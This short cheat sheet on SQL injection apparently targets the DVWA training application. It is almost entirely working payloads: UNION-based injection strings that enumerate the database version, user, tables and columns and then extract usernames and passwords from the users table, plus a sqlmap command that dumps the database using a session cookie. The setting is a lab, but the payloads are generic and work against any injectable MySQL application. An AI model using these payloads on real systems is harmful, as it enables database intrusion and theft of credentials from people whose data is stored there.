# SQL Injection

Try:

```bash
z' or '1'='1
z' or 1=0 union select null, version() #
z' or 1=0 union select null, user() #
z' or 1=0 union select null, database() #
z' and 1=0 union select null, table_name from information_schema.tables #
z' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
z' and 1=0 union select null, column_name from information_schema.columns where table_name = 'users' #
z' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
```

OR

```bash
' union select user, password from dvwa.users #
```

## SQLMAP

```bash
sqlmap -u 'http://192.168.56.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie='PHPSESSID=xxxx; security=low' --dump
```
